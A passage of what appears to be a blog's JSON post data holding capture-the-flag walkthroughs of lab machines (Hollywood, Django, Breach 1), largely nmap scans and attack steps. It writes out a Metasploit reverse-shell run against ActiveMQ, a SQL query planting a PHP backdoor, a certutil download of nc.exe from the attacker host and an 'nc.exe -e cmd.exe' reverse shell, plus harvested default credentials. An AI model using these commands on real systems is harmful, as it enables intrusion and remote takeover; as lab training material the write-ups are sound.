microsoft-ds (workgroup: WORKGROUP)554/tcp open rtsp?1883/tcp open mqtt| mqtt-subscribe: | Topics and their most recent payloads: | ActiveMQ/Advisory/Consumer/Topic/#: |_ ActiveMQ/Advisory/MasterBroker: 2224/tcp open http Mercury/32 httpd|_http-title: Mercury HTTP Services2869/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)3306/tcp open mysql MariaDB (unauthorized)5672/tcp open amqp?|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GetRequest, HTTPOptions, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: |_ AMQP8009/tcp open ajp13 Apache Jserv (Protocol v1.3)|_ajp-methods: Failed to get a valid response for the OPTION request8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1|_http-server-header: Apache-Coyote/1.1|_http-title: Apache Tomcat/7.0.56|_http-favicon: Apache Tomcat8089/tcp open ssl/http Splunkd httpd|_http-server-header: Splunkd|_http-title: splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2019-10-28T09:17:32|_Not valid after: 2022-10-27T09:17:32| http-robots.txt: 1 disallowed entry |_/8161/tcp open http Jetty 8.1.16.v20140903|_http-title: Apache ActiveMQ|_http-server-header: Jetty(8.1.16.v20140903)10243/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found14620/tcp filtered unknown49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPC49251/tcp open tcpwrapped61613/tcp open stomp Apache ActiveMQ 5.10.1 - 5.11.161614/tcp open http Jetty 8.1.16.v20140903|_http-server-header: Jetty(8.1.16.v20140903)| http-methods: |_ Potentially risky methods: TRACE|_http-title: Error 500 Server Error61616/tcp open apachemq ActiveMQ OpenWire transport| fingerprint-strings: | NULL: | ActiveMQ| TcpNoDelayEnabled| SizePrefixDisabled| CacheSize| StackTraceEnabled| CacheEnabled| TightEncodingEnabled| MaxFrameSize| MaxInactivityDuration|_ MaxInactivityDurationInitalDelay2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)=======SF-Port5672-TCP:V=7.94%I=7%D=10/3%Time=651C3189%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,8,\"AMQP\\0\\x01\\0\\0\")%r(HTTPOptions,8,\"AMQP\\0\\x01\\0\\0\")%r(RTSPReSF:quest,8,\"AMQP\\0\\x01\\0\\0\")%r(RPCCheck,8,\"AMQP\\0\\x01\\0\\0\")%r(DNSVersionBiSF:ndReqTCP,8,\"AMQP\\0\\x01\\0\\0\")%r(DNSStatusRequestTCP,8,\"AMQP\\0\\x01\\0\\0\")%SF:r(SSLSessionReq,8,\"AMQP\\0\\x01\\0\\0\")%r(TerminalServerCookie,8,\"AMQP\\0\\x0SF:1\\0\\0\")%r(TLSSessionReq,8,\"AMQP\\0\\x01\\0\\0\")%r(Kerberos,8,\"AMQP\\0\\x01\\0\\SF:0\")%r(SMBProgNeg,8,\"AMQP\\0\\x01\\0\\0\")%r(X11Probe,8,\"AMQP\\0\\x01\\0\\0\")%r(FSF:ourOhFourRequest,8,\"AMQP\\0\\x01\\0\\0\")%r(LPDString,8,\"AMQP\\0\\x01\\0\\0\")%r(SF:LDAPSearchReq,8,\"AMQP\\0\\x01\\0\\0\")%r(LDAPBindReq,8,\"AMQP\\0\\x01\\0\\0\")%r(SSF:IPOptions,8,\"AMQP\\0\\x01\\0\\0\")%r(LANDesk-RC,8,\"AMQP\\0\\x01\\0\\0\")%r(TerminSF:alServer,8,\"AMQP\\0\\x01\\0\\0\")%r(NCP,8,\"AMQP\\0\\x01\\0\\0\")%r(NotesRPC,8,\"AMSF:QP\\0\\x01\\0\\0\")%r(WMSRequest,8,\"AMQP\\0\\x01\\0\\0\")%r(oracle-tns,8,\"AMQP\\0\\SF:x01\\0\\0\")%r(ms-sql-s,8,\"AMQP\\0\\x01\\0\\0\")%r(afp,8,\"AMQP\\0\\x01\\0\\0\")%r(giSF:op,8,\"AMQP\\0\\x01\\0\\0\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)=======SF-Port61616-TCP:V=7.94%I=7%D=10/3%Time=651C3183%P=x86_64-pc-linux-gnu%r(NSF:ULL,F4,\"\\0\\0\\0\\xf0\\x01ActiveMQ\\0\\0\\0\\n\\x01\\0\\0\\0\\xde\\0\\0\\0\\t\\0\\x11TcpNoSF:DelayEnabled\\x01\\x01\\0\\x12SizePrefixDisabled\\x01\\0\\0\\tCacheSize\\x05\\0\\0SF:\\x04\\0\\0\\x11StackTraceEnabled\\x01\\x01\\0\\x0cCacheEnabled\\x01\\x01\\0\\x14TiSF:ghtEncodingEnabled\\x01\\x01\\0\\x0cMaxFrameSize\\x06\\0\\0\\0\\0\\x06@\\0\\0\\0\\x15SF:MaxInactivityDuration\\x06\\0\\0\\0\\0\\0\\0u0\\0\\x20MaxInactivityDurationInitaSF:lDelay\\x06\\0\\0\\0\\0\\0\\0'\\x10\");Service Info: Hosts: localhost, HOLLYWOOD; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_clock-skew: mean: -2h05m27s, deviation: 4h36m58s, median: 34m26s| smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required| smb2-time: | date: 2023-10-03T15:58:08|_ start_date: 2020-04-02T14:13:04| smb-os-discovery: | OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1| Computer name: Hollywood| NetBIOS computer name: HOLLYWOOD\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2023-10-03T23:58:13+08:00```{: .nolineno}## Web Enumeration â¤µï¸I firstly look at all the http and https ports try to enumerate with default credentials through doing this I got encountered with this port `8161` :![Untitled](/Vulnhub-Files/img/Hollywood/Untitled%201.png)I tried the login credentails as `admin : admin` and I got in â†’![Untitled](/Vulnhub-Files/img/Hollywood/Untitled%202.png)I got a flag and I also got the version of this service so I searched on web regarding the exploit and I found this â†’[https://www.exploit-db.com/exploits/48181](https://www.exploit-db.com/exploits/48181)I launched metasploit and tried this exploit and I got the shell like this â†’```bashmsf6 exploit(windows/http/apache_activemq_traversal_upload) > optionsModule options (exploit/windows/http/apache_activemq_traversal_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD admin yes Password to authenticate with PATH /fileserver/..\\admin\\ yes Traversal path Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic s/using-metasploit.html RPORT 8161 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the web application USERNAME admin yes Username to authenticate with subdomain no HTTP server virtual hostPayload options (java/jsp_shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port SHELL no The system shell to use.Exploit target: Id Name -- ---- 0 Windows JavaView the full module info with the info, or info -d command.msf6 exploit(windows/http/apache_activemq_traversal_upload) > set RHOSTS 10.150.150.219RHOSTS => 10.150.150.219msf6 exploit(windows/http/apache_activemq_traversal_upload) > set LHOST tun0LHOST => 10.66.66.178msf6 exploit(windows/http/apache_activemq_traversal_upload) > run[*] Started reverse TCP handler on 10.66.66.178:4444 [*] Uploading payload...[*] Payload sent. Attempting to execute the payload.[+] Payload executed![*] Command shell session 1 opened (10.66.66.178:4444 -> 10.150.150.219:49337) at 2023-10-03 21:30:28 +0530Shell Banner:Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Users\\User\\Desktop\\apache-activemq-5.11.1-bin\\apache-activemq-5.11.1\\bin>----- C:\\Users\\User\\Desktop\\apache-activemq-5.11.1-bin\\apache-activemq-5.11.1\\bin>dirdir Volume in drive C has no label. Volume Serial Number is 021A-9C32 Directory of C:\\Users\\User\\Desktop\\apache-activemq-5.11.1-bin\\apache-activemq-5.11.1\\bin11/13/2018 05:06 PM .11/13/2018 05:06 PM ..02/13/2015 11:05 AM 19,091 activemq02/13/2015 11:05 AM 5,665 activemq-admin02/13/2015 11:05 AM 4,211 activemq-admin.bat02/13/2015 11:05 AM 4,211 activemq.bat02/13/2015 11:02 AM 15,956 activemq.jar11/13/2018 05:06 PM win3211/13/2018 05:06 PM win6402/13/2015 10:54 AM 83,820 wrapper.jar 6 File(s) 132,954 bytes 4 Dir(s) 44,538,482,688 bytes freeC:\\Users\\User\\Desktop\\apache-activemq-5.11.1-bin\\apache-activemq-5.11.1\\bin>C:C:\\>net usersnet usersUser accounts for \\\\HOLLYWOOD-------------------------------------------------------------------------------Administrator Guest User The command completed successfully.C:\\>whoamiwhoamihollywood\\userC:\\>whoami /allwhoami /allUSER INFORMATION----------------User Name SID ============== =======================================hollywood\\user S-1-5-21-2591336358-2979681539-3579421877-1000GROUP INFORMATION-----------------Group Name Type SID Attributes ============================================================= ================ ============================================== ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Group used for deny only HOLLYWOOD\\HomeUsers Alias S-1-5-21-2591336358-2979681539-3579421877-1001 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Administrators Alias S-1-5-32-544 Group used for deny only BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Mandatory Level Label S-1-16-8192 Mandatory group, Enabled by default, Enabled groupPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ==================================== =SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone DisabledC:\\>net localgroupnet localgroupAliases for \\\\HOLLYWOOD-------------------------------------------------------------------------------*Administrators*Backup Operators*Cryptographic Operators*Distributed COM Users*Event Log Readers*Guests*HomeUsers*IIS_IUSRS*Network Configuration Operators*Performance Log Users*Performance Monitor Users*Power Users*Remote Desktop Users*Replicator*UsersThe command completed successfully.C:\\>net localgroup Administratorsnet localgroup AdministratorsAlias name AdministratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------AdministratorUserThe command completed successfully.C:\\>```{: .nolineno}Now I have Administrators privileges too so , I can find all the FLAGs from here !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Django", "url": "/posts/Django/", "categories": "PwnTillDawn", "tags": "FTP, PhpMyAdmin, Windows, PrivEsc", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸ This is a *Django* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup.com...", "content": "## Description â¤µï¸ This is a *Django* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup.com/ .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/212]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.212Not shown: 65521 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp| ftp-syst: |_ SYST: Internet Component Suite|_ftp-bounce: bounce working!| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drw-rw-rw- 1 ftp ftp 0 Mar 26 2019 . [NSE: writeable]| drw-rw-rw- 1 ftp ftp 0 Mar 26 2019 .. [NSE: writeable]| drw-rw-rw- 1 ftp ftp 0 Mar 13 2019 FLAG [NSE: writeable]| -rw-rw-rw- 1 ftp ftp 34419 Mar 26 2019 xampp-control.log [NSE: writeable]|_-rw-rw-rw- 1 ftp ftp 881 Nov 13 2018 zen.txt [NSE: writeable]| fingerprint-strings: | GenericLines: | 220-Wellcome to Home Ftp Server!| Server ready.| command not understood.| command not understood.| Help: | 220-Wellcome to Home Ftp Server!| Server ready.| 'HELP': command not understood.| NULL, SMBProgNeg: | 220-Wellcome to Home Ftp Server!| Server ready.| SSLSessionReq: | 220-Wellcome to Home Ftp Server!| Server ready.|_ command not understood.80/tcp open http Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38| http-title: Welcome to XAMPP|_Requested resource was http://10.150.150.212/dashboard/135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38|_ssl-date: TLS randomness does not represent time| http-title: Welcome to XAMPP|_Requested resource was https://10.150.150.212/dashboard/445/tcp open ï¿½ï¿½ï¿½m Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: PWNTILLDAWN)3306/tcp open mysql MariaDB (unauthorized)8089/tcp open ssl/http Splunkd httpd| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2019-10-29T14:31:26|_Not valid after: 2022-10-28T14:31:26|_http-title: splunkd49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPC49158/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.94%I=7%D=10/3%Time=651BE10E%P=x86_64-pc-linux-gnu%r(NULLSF:,35,\"220-Wellcome\\x20to\\x20Home\\x20Ftp\\x20Server!\\r\\n220\\x20Server\\x20rSF:eady\\.\\r\\n\")%r(GenericLines,79,\"220-Wellcome\\x20to\\x20Home\\x20Ftp\\x20SeSF:rver!\\r\\n220\\x20Server\\x20ready\\.\\r\\n500\\x20'\\r':\\x20command\\x20not\\x20SF:understood\\.\\r\\n500\\x20'\\r':\\x20command\\x20not\\x20understood\\.\\r\\n\")%r(SF:Help,5A,\"220-Wellcome\\x20to\\x20Home\\x20Ftp\\x20Server!\\r\\n220\\x20Server\\SF:x20ready\\.\\r\\n500\\x20'HELP':\\x20command\\x20not\\x20understood\\.\\r\\n\")%r(SF:SSLSessionReq,89,\"220-Wellcome\\x20to\\x20Home\\x20Ftp\\x20Server!\\r\\n220\\xSF:20Server\\x20ready\\.\\r\\n500\\x20'\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\xd7\\xf7\\SF:xba,\\xee\\xea\\xb2`~\\xf3\\0\\xfd\\x82{\\xb9\\xd5\\x96\\xc8w\\x9b\\xe6\\xc4\\xdb| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required```{: .nolineno}## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/212]â””â”€$ ftp 10.150.150.212 21Connected to 10.150.150.212.220-Wellcome to Home Ftp Server!220 Server ready.Name (10.150.150.212:kali): Anonymous331 Password required for Anonymous.Password: 230 User Anonymous logged in.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al227 Entering Passive Mode (10,150,150,212,192,35).150 Opening data connection for directory list.drw-rw-rw- 1 ftp ftp 0 Mar 26 2019 .drw-rw-rw- 1 ftp ftp 0 Mar 26 2019 ..drw-rw-rw- 1 ftp ftp 0 Mar 13 2019 FLAG-rw-rw-rw- 1 ftp ftp 34419 Mar 26 2019 xampp-control.log-rw-rw-rw- 1 ftp ftp 881 Nov 13 2018 zen.txt226 File sent okftp>```{: .nolineno}I got the flag and some information :with file called `xampp-control.log` file I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/212]â””â”€$ cat xampp-control.log | grep password3:11:25 PM [main] \tXAMPP Password Written in: \"c:\\xampp\\passwords.txt\"```{: .nolineno}Now with FTP I tried to access this data and I got it like this â†’```bashftp> get c:\\xampp\\passwords.txtlocal: c:xampppasswords.txt remote: c:xampppasswords.txt227 Entering Passive Mode (10,150,150,212,192,78).501 Cannot RETR. File not foundftp> get c:\\\\xampp\\\\passwords.txtlocal: c:\\xampp\\passwords.txt remote: c:\\xampp\\passwords.txt227 Entering Passive Mode (10,150,150,212,192,79).150 Opening data connection for c:\\xampp\\passwords.txt.100% |***********************************************************************************| 816 10.36 KiB/s 00:00 ETA226 File sent ok816 bytes received in 00:00 (3.11 KiB/s)ftp>```{: .nolineno}Now I have credentails â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/212]â””â”€$ cat c:\\\\xampp\\\\passwords.txt ### XAMPP Default Passwords ###1) MySQL (phpMyAdmin): User: root Password:thebarrierbetween2) FileZilla FTP: [ You have to create a new user on the FileZilla Interface ] 3) Mercury (not in the USB & lite version): Postmaster: Postmaster (postmaster@localhost) Administrator: Admin (admin@localhost) User: newuser Password: wampp 4) WEBDAV: User: xampp-dav-unsecure Password: ppmax2011 Attention: WEBDAV is not active since XAMPP Version 1.7.4. For activation please comment out the httpd-dav.conf and following modules in the httpd.conf LoadModule dav_module modules/mod_dav.so LoadModule dav_fs_module modules/mod_dav_fs.so Please do not forget to refresh the WEBDAV authentification (users and passwords).```{: .nolineno}Now with port 443 I could able to access the phpmyadmin dashboad along with above credentials â†’![Untitled](/Vulnhub-Files/img/Django/Untitled%201.png)Lets do a RFI here with including a php payload file through sql querry , we also know that the server is loading the files from this location â†’![Untitled](/Vulnhub-Files/img/Django/Untitled%202.png)So Lets go to SQL tab and Enter this query to include this script into this `backdoor.php` file â†’```bashSELECT \"\" INTO OUTFILE \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"```{: .nolineno}![Untitled](/Vulnhub-Files/img/Django/Untitled%203.png)Now After running it successfuly lets run `backdoor.php` file â†’```bashhttps://10.150.150.212/backdoor.php?cmd=whoami```{: .nolineno}![Untitled](/Vulnhub-Files/img/Django/Untitled%204.png)Since I have the victim machine as windows so I and getting this output â†’![Untitled](/Vulnhub-Files/img/Django/Untitled%205.png)Now I upload the `nc.exe` executable netcat into the system and get the reverse shell like this â†’```bashhttps://10.150.150.212/backdoor.php?cmd=certutil.exe%20%20-urlcache%20-f%20http://10.66.66.178/nc.exe%20nc.exe```{: .nolineno}Now I loaded the reverse shell like this and got the lisener response too â†’```bashhttps://10.150.150.212/backdoor.php?cmd=nc.exe%20-e%20cmd.exe%2010.66.66.178%202222```{: .nolineno}Response to that I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/212]â””â”€$ nc -lvnp 2222listening on [any] 2222 ...connect to [10.66.66.178] from (UNKNOWN) [10.150.150.212] 49420Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\xampp\\htdocs>C:\\xampp\\htdocs>whoamiwhoamidjango\\chuck.norrisC:\\xampp\\htdocs>whoami /allwhoami /allUSER INFORMATION----------------User Name SID =================== =====================================django\\chuck.norris S-1-5-21-3240963974-954304941-870914348-1003GROUP INFORMATION-----------------Group Name Type SID Attributes ============================================================= ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Group used for deny only BUILTIN\\Administrators Alias S-1-5-32-544 Group used for deny only BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Mandatory Level Label S-1-16-8192 Mandatory group, Enabled by default, Enabled groupPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ==================================== =SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone DisabledC:\\xampp\\htdocs>```{: .nolineno}Now with this user as `django\\chuck.norris` I got all the FLAGs that I need , But I have to be Administrator so for that I enumerated futher and I got to know that â†’```bashC:\\Users\\chuck.norris\\Desktop>dirdir Volume in drive C has no label. Volume Serial Number is 3829-EAA8 Directory of C:\\Users\\chuck.norris\\Desktop02/05/2019 10:41 AM .02/05/2019 10:41 AM ..02/05/2019 10:40 AM 40 FLAG11.txt 1 File(s) 40 bytes 2 Dir(s) 3,847,512,064 bytes freeC:\\Users\\chuck.norris\\Desktop>net user net userUser accounts for \\\\DJANGO-------------------------------------------------------------------------------Administrator chuck.norris Guest rambo The command completed successfully.C:\\Users\\chuck.norris\\Desktop>net localgroupnet localgroupAliases for \\\\DJANGO-------------------------------------------------------------------------------*Administrators*Distributed COM Users*Event Log Readers*Guests*IIS_IUSRS*Performance Log Users*Performance Monitor Users*UsersThe command completed successfully.C:\\Users\\chuck.norris\\Desktop>net localgroup Administratorsnet localgroup AdministratorsAlias name AdministratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------Administratorchuck.norrisThe command completed successfully.C:\\Users\\chuck.norris\\Desktop>```{: .nolineno}Since user `chuck.norris` is in Administrators group so now I suppose I am admin too !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Breach 1", "url": "/posts/Breach-1/", "categories": "VulnHub", "tags": "PrivEsc, SUIDs, keystore, keytool, pkexec, Wireshark", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸ This Machine is from VulnHub Platform, and categorized as Easy-Intermediate Level. To set the Host Only Adapter got to VirtualBox > Tools > Network and then follow this image :![P...", "content": "## Description â¤µï¸ This Machine is from VulnHub Platform, and categorized as Easy-Intermediate Level. To set the Host Only Adapter got to VirtualBox > Tools > Network and then follow this image :![PATH](/Vulnhub-Files/img/Breach/image.png)_Follow the Path that are marked through numbers_Now click ok and set the Host machine with that network and you are good to go !!## Port Scan Results â¤µï¸Too many ports are open on this system so I scanned TOP 100 ports here â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Breach/1]â””â”€$ sudo nmap -sC -sV --top-ports 100 192.168.110.140 Nmap scan report for 192.168.110.140Host is up (0.0026s latency).PORT STATE SERVICE VERSION7/tcp open echo?| fingerprint-strings: | NULL: |_ 550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff009/tcp open discard?| fingerprint-strings: | NULL: |_ 550 12345 0ffffffffff80000088808000000888800000008887ffffffffff0013/tcp open daytime?| fingerprint-strings: | NULL: |_ 550 12345 0ffffffff000000888000000000800000080000008800007fffff0021/tcp open ftp?|_ssl-date: ERROR: Script execution failed (use -d to debug)|_ftp-syst: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)| fingerprint-strings: | NULL: |_ 550 12345 0f7000f800770008777000000000000000f80008f7f70088000cf00|_ftp-anon: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_ftp-bounce: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_ssl-cert: ERROR: Script execution failed (use -d to debug)22/tcp open ssh?| fingerprint-strings: | NULL: |_ 550 12345 0f8008c008fff8000000000000780000007f800087708000800ff0023/tcp open telnet?| fingerprint-strings: | NULL: |_ 550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff0025/tcp open smtp?|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed| fingerprint-strings: | NULL: |_ 550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff0026/tcp open rsftp?| fingerprint-strings: | NULL: |_ 550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff0037/tcp open time?| fingerprint-strings: | NULL: |_ 550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff0053/tcp open domain?| fingerprint-strings: | NULL: |_ 550 4m2v4 FUZZ_HERE|_dns-nsid: ERROR: Script execution failed (use -d to debug)79/tcp open http Mini web server ren_ (ZTE ZXV10 W300 ADSL router http config)| finger: HTTP/1.0 200 OK\\x0D| Server: Mini web server ren_ ZTE corp 2005.\\x0D|_|_http-server-header: Mini web server ren_ ZTE corp 2005.|_http-title: Site doesnt have a title.80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Welcome to Breach 1.081/tcp open telnet APC PDU/UPS devices or Windows CE telnetd| fingerprint-strings: | NULL: | OMAJBeBY Ver. Dn (c) Copyright 47Redline Communications Inc.|_ Username:088/tcp open kerberos-sec?| fingerprint-strings: | NULL: | HTTP/1.0 200 OKu| Server: ZOT-PS-11/388393917|_ 106/tcp open telnet BusyBox telnetd 1.00-pre7 - 1.14.0| fingerprint-strings: | NULL: |_ FVSklogin:110/tcp open pop3pw Mercury/32 poppass service111/tcp open telnet| fingerprint-strings: | NULL: | ArrowKey Or AZ:Move Cursor, Enter:Select, ESC:Escape, L:Line Draw, X:Redraw | [?25l|_ +Areca Technology Corporation RAID Controller113/tcp open ident?| fingerprint-strings: | NULL: | HTTP/1.0 499 Access Denied.| Content-Length: 0r| Content-Type: text/html| Connection: close|_ Access DeniedNavi Error. Access Denied.Please check the typed URL.119/tcp open nntp?| fingerprint-strings: | NULL: | ={74}| Transition Networks Telnet Server| System name: SMKG-PKGEAST-fIQhKkc| Press CTRL-D to disconnect.|_ Enter password:135/tcp open smtp INDY smtpd|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed139/tcp open http RapidLogic httpd 621 (VG112-D51 VoIP CPE http config)|_http-title: Site doesnt have a title.|_http-server-header: RapidLogic/621143/tcp open http Aladdin/SafeNet HASP license manager wlKTOkJzC|_http-server-header: HASP LM/wlKTOkJzC|_http-title: 403 Forbidden|_imap-capabilities: CAPABILITY144/tcp open news?| fingerprint-strings: | NULL: | HTTP/1.1 200 OK| Connection: close| | Siemens Sm@rtClient Desktop [WinVNC]| | | | |_ 179/tcp open ssh (protocol 331328539)| fingerprint-strings: | NULL: |_ SSH-331328539-ReflectionForSecureIT_LLLCe199/tcp open http AEG Powersolutions UPS View http viewer|_http-server-header: qHTTPs389/tcp open http Sandpiper Footprint http load balancer 30213|_http-server-header: Footprint 30213/FPMCP|_http-title: Site doesnt have a title.427/tcp open telnet LinuxNode telnetd 893354443/tcp open https?| fingerprint-strings: | NULL: | 000Sonork Server VU)NcnY ready| 0000000000000000000000000000000000000000000SGI=0000| 000000000|_ (?00000000444/tcp open imap UW imapd|_imap-capabilities: CAPABILITY445/tcp open microsoft-ds?| fingerprint-strings: | NULL: | #connected,all connect count: 1{\"event\":\"device_status\",\"data\":{\"wifi_name\":\"P|_ \",\"wifi_signal\":3\"battery\":6\"batterycharging\":n\"gsm_signal\":4\"sms_unread\":1\"sdcard\":2\"updateinfo\":null}}\"465/tcp open http ACOS httpd 685928063 (Foxconn VoIP TRIO 3C http config)|_http-title: Site doesnt have a title (text/html; charset=BIG5).|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed|_http-server-header: ACOS HTTPD/685928063513/tcp open icy SHOUTcast server 05 